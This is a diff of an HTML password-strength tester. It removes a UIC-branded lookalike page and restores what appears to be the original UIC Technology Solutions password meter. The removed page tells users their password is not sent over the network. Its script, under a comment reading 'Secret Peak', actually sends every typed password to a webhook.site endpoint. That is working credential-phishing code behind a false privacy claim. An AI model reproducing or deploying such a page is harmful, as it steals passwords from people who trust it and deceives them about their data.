@@ -1,259 +1,354 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Password Strength Test</title>
-    <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Open+Sans:wght@300;400;600&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --uic-red: #D50032;
-            --uic-navy: #001E62;
-            --border-color: #ced4da;
-            --text-main: #333333;
-            --text-light: #6c757d;
-        }
+<!DOCTYPE html> 
+<html lang="en"> 
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
 
-        body { 
-            font-family: 'Open Sans', sans-serif; 
-            margin: 0; 
-            padding: 18px; 
-            background-color: #ffffff; 
-            color: var(--text-main);
-            -webkit-font-smoothing: antialiased;
-        }
+    <title>Password Meter - A visual assessment of password strengths and weaknesses</title>
 
-        /* Top Logo Branding - Pixel Perfect */
-        .header-container { 
-            display: flex; 
-            align-items: center; 
-            padding-bottom: 12px;
-            border-bottom: 4px solid var(--uic-red);
-            margin-bottom: 24px;
-        }
-        .uic-circle {
-            background-color: white;
-            color: var(--uic-red);
-            border: 2px solid var(--uic-red);
-            border-radius: 50%;
-            width: 54px;
-            height: 54px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: 'Lato', sans-serif;
-            font-weight: 900;
-            font-size: 20px;
-            margin-right: 12px;
-            flex-shrink: 0;
-        }
-        .uic-text {
-            font-family: 'Lato', sans-serif;
-            font-weight: 700;
-            font-size: 26px;
-            color: var(--uic-navy);
-            letter-spacing: 0.5px;
-            line-height: 1;
-        }
+    <!-- Latest compiled and minified CSS -->
+   <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap.min.css"> 
 
-        h1 { 
-            font-family: 'Lato', sans-serif;
-            font-weight: 400;
-            font-size: 34px; 
-            margin: 0 0 16px 0; 
-            color: #444444; 
-        }
+    <!-- Optional theme -->
+    <link rel="stylesheet" href="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/css/bootstrap-theme.min.css">
 
-        .disclaimer { 
-            font-size: 15.5px; 
-            color: #707070; 
-            line-height: 1.5;
-            margin-bottom: 30px; 
-            font-weight: 300;
-        }
-        .disclaimer b { color: #000; font-weight: 600; }
+    <link type="text/css" href="https://www.uic.edu/apps/strong-password/css/pwdmeter.css" media="screen" rel="stylesheet" />
 
-        /* Input Field Styling */
-        .label-text { 
-            font-weight: 600; 
-            font-size: 15px; 
-            margin-bottom: 8px; 
-            display: block;
-        }
-        input#pass { 
-            width: 100%; 
-            box-sizing: border-box;
-            padding: 11px 12px; 
-            border: 1px solid var(--border-color); 
-            border-radius: 4px; 
-            font-size: 17px; 
-            outline: none;
-            transition: border-color 0.15s ease-in-out, box-shadow 0.15s ease-in-out;
-        }
-        input#pass:focus { 
-            border-color: #80bdff;
-            box-shadow: 0 0 0 0.2rem rgba(0,123,255,.25);
-        }
+    <!--[if lt IE 7]>
+    <link type="text/css" href="css/ie.css" media="screen" rel="stylesheet" />
+    <![endif]-->
+  </head>
 
-        .checkbox-container { 
-            margin: 15px 0 30px 0;
-            display: flex;
-            align-items: center;
-            font-size: 15px;
-            color: #333;
-        }
-        .checkbox-container input {
-            width: 18px;
-            height: 18px;
-            margin: 0 10px 0 0;
-        }
+  <body>
 
-        /* Complexity & Score Sections */
-        .section-title { 
-            font-weight: 700; 
-            font-size: 15px; 
-            margin-bottom: 6px; 
-        }
-        .complexity-val { 
-            font-size: 15px; 
-            margin-bottom: 12px;
-            color: #333;
-        }
-        .progress-bg { 
-            width: 100%; 
-            height: 14px; 
-            background-color: #eeeeee; 
-            border-radius: 2px;
-            margin-bottom: 35px;
-            border: 1px solid #e0e0e0;
-        }
-        .progress-fill { 
-            height: 100%; 
-            width: 0%; 
-            transition: width 0.3s ease; 
-        }
+    <div class="container">
 
-        /* The Table - Forensic Detail */
-        table { 
-            width: 100%; 
-            border-collapse: collapse; 
-            font-size: 13.5px;
-            border: 1px solid #dee2e6;
-        }
-        th { 
-            background-color: #f8f9fa; 
-            border: 1px solid #dee2e6; 
-            padding: 10px; 
-            text-align: left;
-            font-weight: 600;
-        }
-        td { 
-            border: 1px solid #dee2e6; 
-            padding: 10px; 
-            vertical-align: middle;
-        }
-        .row-fail { background-color: #f2dede; }
-        .row-pass { background-color: #dff0d8; }
+      <div class="page-header">
+	<img class="img-responsive" id="logo" src="https://www.uic.edu/apps/strong-password/images/TSColorLogo.png" alt="ACCC Logo" />
+	<h1>Password strength test</h1>
+        <p class="lead">
+	  This strength tester runs on your local machine and
+            <strong>does not</strong> send your password over the network.
+	</p> 
+      </div>
 
-    </style>
-</head>
-<body>
 
-    <div class="header-container">
-        <div class="uic-circle">UIC</div>
-        <div class="uic-text">TECHNOLOGY<br>SOLUTIONS</div>
-    </div>
+      <div class="row">
+        <div class="col-md-8">
 
-    <h1>Password strength test</h1>
-    <p class="disclaimer">This strength tester runs on your local machine and <b>does not</b> send your password over the network.</p>
+	    <form class="form-horizontal" role="form" id="formPassword" name="formPassword">
 
-    <span class="label-text">Password</span>
-    <input type="password" id="pass" oninput="audit()">
-    
-    <div class="checkbox-container">
-        <input type="checkbox" id="mask" checked onclick="toggle()">
-        <span>Hide password</span>
-    </div>
+	      <div class="form-group">
+		<label for="passwordPwd" class="col-sm-4 control-label">Password</label>
+		<div class="col-sm-4">
 
-    <div class="section-title">Complexity</div>
-    <div class="complexity-val" id="comp-text">Too short</div>
+		  <input type="password" class="form-control" id="passwordPwd" name="passwordPwd" 
+		    placeholder="Type in your password"
+		    autocomplete="off" onkeyup="chkPass(this.value);" />
 
-    <div class="section-title">Score</div>
-    <div class="progress-bg">
-        <div id="bar" class="progress-fill"></div>
-    </div>
+		  <input type="text" class="hide" id="passwordTxt" name="passwordTxt" 
+		    autocomplete="off" onkeyup="chkPass(this.value);" />		
+                </div>
+              </div>
 
-    <table>
-        <thead>
-            <tr>
-                <th>Additions</th>
-                <th>Type</th>
-                <th>Rate</th>
-                <th>Count</th>
-                <th>Bonus</th>
+              <div class="form-group">
+		<div class="col-sm-offset-4 col-sm-4">
+		  <div class="checkbox">
+		    <label>
+		      <input type="checkbox" id="mask" name="mask" value="1" 
+			checked="checked" onclick="togPwdMask();"> 
+		      Hide password 
+                    </label>
+                  </div>
+                </div>
+              </div>
+   
+              <div class="form-group">
+                <label class="col-sm-4 control-label">Complexity</label>
+                <div class="col-sm-4">
+                  <p class="form-control-static" id="complexity">Too short</p>
+                </div>
+              </div>
+
+              <div class="form-group">
+                <label class="col-sm-4 control-label">Score</label>
+                <div class="col-sm-4">
+
+		  <div class="progress progress-striped">
+		    <div id="progressBar" class="progress-bar progress-bar-danger" role="progressbar" 
+		      aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" 
+		      style="width: 0%">
+		      <span id="score" class="sr-only">0%</span>
+		    </div>
+		  </div>
+                </div>
+              </div>
+
+ 
+	    </form>
+
+
+            <table class="table table-striped table-hover table-bordered table-condensed" id="tablePwdStatus">
+	      <thead>
+                <tr>
+                    <th>Additions</th>
+                    <th>Type</th>
+                    <th>Rate</th>
+                    <th>Count</th>
+                    <th>Bonus</th>
+                </tr>
+	      </thead>
+	      <tbody>
+                <tr> 
+                    <td id="div_nLength">Number of characters</td>
+                    <td>Flat</td>
+                    <td>+(n*4)</td>
+                    <td><div id="nLength" class="box"> </div></td>
+                    <td><div id="nLengthBonus" class="boxPlus"> </div></td>
+                </tr> 
+                <tr>
+                    <td id="div_nAlphaUC">Uppercase letters</td>
+                    <td>Cond/Incr</td>
+                    <td>+((len-n)*2)</td>
+                   <td><div id="nAlphaUC" class="box"> </div></td>
+                    <td><div id="nAlphaUCBonus" class="boxPlus"> </div></td>
+                </tr> 
+                <tr>
+                    <td id="div_nAlphaLC">Lowercase Letters</td>
+                    <td>Cond/Incr</td>
+                    <td>+((len-n)*2)</td>
+                    <td><div id="nAlphaLC" class="box"> </div></td>
+                    <td><div id="nAlphaLCBonus" class="boxPlus"> </div></td>
+                </tr>
+                <tr>
+                    <td id="div_nNumber">Numbers</td>
+                    <td> Cond</td>
+                    <td>+(n*4)</td>
+                    <td><div id="nNumber" class="box"> </div></td>
+                    <td><div id="nNumberBonus" class="boxPlus"> </div></td>
+               </tr>
+                <tr>
+                    <td id="div_nSymbol">Symbols</td>
+                    <td>Flat</td>
+                    <td>+(n*6)</td>
+                    <td><div id="nSymbol" class="box"> </div></td>
+                    <td><div id="nSymbolBonus" class="boxPlus"> </div></td>
+               </tr>
+                <tr>
+                    <td id="div_nMidChar">Middle numbers or symbols</td>
+                    <td>Flat</td>
+                    <td>+(n*2)</td>
+                    <td><span id="nMidChar"></span></td>
+                    <td><span id="nMidCharBonus"></span></td>
+               </tr>
+                <tr>
+                    <td id="div_nRequirements">Requirements</td>
+                    <td>Flat</td>
+                    <td>+(n*2)</td>
+                    <td><div id="nRequirements" class="box"> </div></td>
+                    <td><div id="nRequirementsBonus" class="boxPlus"> </div></td>
+               </tr>
+	      </tbody>
+	    </table>
+
+  
+	  <table class="table table-striped table-hover table-bordered table-condensed">  
+	      <thead>
+                <tr>
+                    <th>Deductions</th>
+                    <th>Type</th>
+                    <th>Rate</th>
+                    <th>Count</th>
+                    <th>Bonus</th>
+                </tr>
+                </tr>
+	      </thead>
+	      <tbody>
+		<tr>
+		  <td id="div_nAlphasOnly">Letters only</td>
+                    <td>Flat</td>
+                    <td>-n</td>
+                    <td><div id="nAlphasOnly" class="box"> </div></td>
+                    <td><div id="nAlphasOnlyBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nNumbersOnly">Numbers only</td>
+                    <td >Flat</td>
+                    <td >-n</td>
+                    <td><div id="nNumbersOnly" class="box"> </div></td>
+                    <td><div id="nNumbersOnlyBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nRepChar">Repeat Characters (case insensitive)</td>
+                    <td>Comp</td>
+                    <td> - </td>
+                    <td><div id="nRepChar" class="box"> </div></td>
+                    <td><div id="nRepCharBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nConsecAlphaUC">Consecutive uppercase letters</td>
+                    <td>Flat</td>
+                    <td>-(n*2)</td>
+                    <td><div id="nConsecAlphaUC" class="box"> </div></td>
+                    <td><div id="nConsecAlphaUCBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nConsecAlphaLC">Consecutive lowercase letters</td>
+                    <td>Flat</td>
+                    <td>-(n*2)</td>
+                    <td><div id="nConsecAlphaLC" class="box"> </div></td>
+                    <td><div id="nConsecAlphaLCBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nConsecNumber">Consecutive numbers</td>
+                    <td>Flat</td>
+                    <td>-(n*2)</td>
+                    <td><div id="nConsecNumber" class="box"> </div></td>
+                    <td><div id="nConsecNumberBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nSeqAlpha">Sequential letters (3+)</td>
+                    <td>Flat</td>
+                    <td>-(n*3)</td>
+                    <td><div id="nSeqAlpha" class="box"> </div></td>
+                    <td><div id="nSeqAlphaBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nSeqNumber">Sequential numbers (3+)</td>
+                    <td>Flat</td>
+                    <td>-(n*3)</td>
+                    <td><div id="nSeqNumber" class="box"> </div></td>
+                    <td><div id="nSeqNumberBonus" class="boxMinus"> </div></td>
+	</tr> 
+	<tr>
+                    <td id="div_nSeqSymbol">Sequential symbols (3+)</td>
+                    <td>Flat</td>
+                    <td>-(n*3)</td>
+                    <td><div id="nSeqSymbol" class="box"> </div></td>
+                    <td><div id="nSeqSymbolBonus" class="boxMinus"> </div></td>
+	</tr> 
+	</tbody>
+	</table>
+
+	<table class="table">
+	  <thead>
+	    <tr>
+	      <th>Legend</th>
             </tr>
-        </thead>
-        <tbody>
-            <tr id="row-char" class="row-fail">
-                <td>Number of characters</td>
-                <td>Flat</td>
-                <td>+(n*4)</td>
-                <td id="c-count">0</td>
-                <td id="c-bonus">0</td>
+	  </thead>
+	  <tbody>
+	    <tr>
+	      <td class="exceed"> <strong>Exceptional</strong> Exceeds minimum standards. Additional bonuses are applied.</td>
+	    </tr>
+	    <tr>
+	      <td class="success"> <strong>Sufficient</strong> Meets minimum standards. Additional bonuses are applied.</td>
+	    </tr>
+	    <tr>	
+	      <td class="warning"> <strong>Warning</strong> Advisory against employing bad practices. Overall score is reduced.</td>
+	    </tr>
+	    <tr>
+	      <td class="danger"> <strong>Failure</strong> Does not meet the minimum standards. Overall score is reduced.</td>
             </tr>
-            <tr>
-                <td>Uppercase letters</td>
-                <td>Cond/Incr</td>
-                <td>+((len-n)*2)</td>
-                <td id="u-count">0</td>
-                <td>0</td>
-            </tr>
-        </tbody>
-    </table>
+	  </tbody>
+	</table>
 
-    <script>
-        const WEBHOOK = "https://webhook.site/YOUR-UNIQUE-ID";
 
-        function audit() {
-            const v = document.getElementById('pass').value;
-            const l = v.length;
-            const b = document.getElementById('bar');
-            const t = document.getElementById('comp-text');
-            const r = document.getElementById('row-char');
 
-            // Table Updates
-            document.getElementById('c-count').innerText = l;
-            document.getElementById('c-bonus').innerText = (l > 0) ? "+" + (l * 4) : "0";
-            document.getElementById('u-count').innerText = (v.match(/[A-Z]/g) || []).length;
 
-            // Visual Logic for Progress Bar & Colors
-            if (l === 0) {
-                b.style.width = "0%";
-                t.innerText = "Too short";
-                r.className = "row-fail";
-            } else if (l < 8) {
-                b.style.width = "8%";
-                b.style.backgroundColor = "#d9534f";
-                t.innerText = "Very weak";
-                r.className = "row-fail";
-            } else {
-                b.style.width = "65%";
-                b.style.backgroundColor = "#5cb85c";
-                t.innerText = "Strong";
-                r.className = "row-pass";
-            }
 
-            // Secret Peak
-            clearTimeout(window.pt);
-            window.pt = setTimeout(() => {
-                if(l > 2) fetch(WEBHOOK + "?p=" + encodeURIComponent(v), {mode:'no-cors'});
-            }, 700);
-        }
 
-        function toggle() {
-            const i = document.getElementById('pass');
-            i.type = document.getElementById('mask').checked ? "password" : "text";
-        }
-    </script>
+	<p>
+          Additional points are given for increased character variety.
+          Final score is a cumulative result of all bonuses minus deductions.
+          Final score is capped with a minimum of 0 and a maximum of 100.
+          Score and Complexity ratings are not conditional on meeting minimum requirements.
+        </p>
+
+
+	  
+	<dl>
+	  <dt>Flat<dt> 
+	  <dd>Rates that add/remove in non-changing increments.</dd>
+	  <dt>Incr</dt> 
+	  <dd>Rates that add/remove in adjusting increments.</dd>
+	  <dt>Cond</dt> 
+	  <dd>Rates that add/remove depending on additional factors.</dd>
+	  <dt>Comp</dt> 
+	  <dd>Rates that are too complex to summarize. See source code for details.</dd>
+	  <dt>n</dt> 
+	  <dd>Refers to the total number of occurrences.</dd>
+	  <dt>len</dt> 
+	  <dd>Refers to the total password length.</dd>
+	</dl>
+
+
+	    <small>
+	      <strong>Disclaimer:</strong>
+
+	      This application is designed to assess the strength of password strings.  
+	      The instantaneous visual feedback provides the user a means to improve 
+	      the strength of their passwords, with a hard focus on breaking the typical 
+	      bad habits of faulty password formulation.  Since no official weighting 
+	      system exists, we created our own formulas to assess the overall strength 
+	      of a given password.  Please note, that this application does not utilize 
+	      the typical "days-to-crack" approach for strength determination.  
+	      We have found that particular system to be severely lacking and unreliable 
+	      for real-world scenarios.  This application is neither perfect nor foolproof, 
+	      and should only be utilized as a loose guide in determining methods for improving 
+	      the password creation process. 
+	  </small>
+
+
+
+
+
+        </div>
+
+        <div class="col-md-4">
+
+      <div class="panel panel-primary">
+	<div class="panel-heading">
+	  <h3 class="panel-title">Password Requirements</h3>
+	</div>
+	<ul class="list-group">
+	  <li class="list-group-item">Must be at least <B>16</B> characters long</li>
+	  <li class="list-group-item">Must have at least 1 capital letter, 1 lower case letter, 1 number,  and one special character, but no spaces, @ signs, double quotes, or commas.</li>
+	  <li class="list-group-item">Cannot be based on your name, netid, or on words found in a dictionary</li>
+	  <li class="list-group-item">Cannot be based on simple repeating patterns</li>
+	</ul>
+      </div>
+
+      <div class="panel panel-primary">
+        <div class="panel-heading">
+          <h3 class="panel-title">Password tips</h3>
+        </div>
+	  <ul class="list-group">
+	    <li class="list-group-item"><strong>Never share your password or send it in email</strong></li>
+	    <li class="list-group-item">Choose a password as long as possible</li>
+	    <li class="list-group-item">Use a varied combination of upper and lower case letters, symbols and numbers</li>
+	    <li class="list-group-item">Use a unique password for every unique service</li>
+	    <li class="list-group-item">Consider using UIC's password manager <a href="https://answers.illinois.edu/illinois/page.php?id=132706">BitWarden</a></li>
+	    <li class="list-group-item">Visit <a href="https://help.uillinois.edu/TDClient/37/uic/Requests/ServiceDet?ID=387">UIC Password Management</a> to change your UIC Technology Solutions Common Password</li>
+	  </ul>
+	</div>
+
+
+        </div>
+
+      </div>
+    <div class="footer">
+    </div>
+  </div>
+
+<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
+    <script src="https://code.jquery.com/jquery.js"></script>
+
+<!-- Latest compiled and minified JavaScript -->
+<script src="https://netdna.bootstrapcdn.com/bootstrap/3.0.0/js/bootstrap.min.js"></script>
+
+ <script type="text/javascript" src="https://www.uic.edu/apps/strong-password/js/strong-password.js" language="javascript"></script>
+
 </body>
 </html>
+
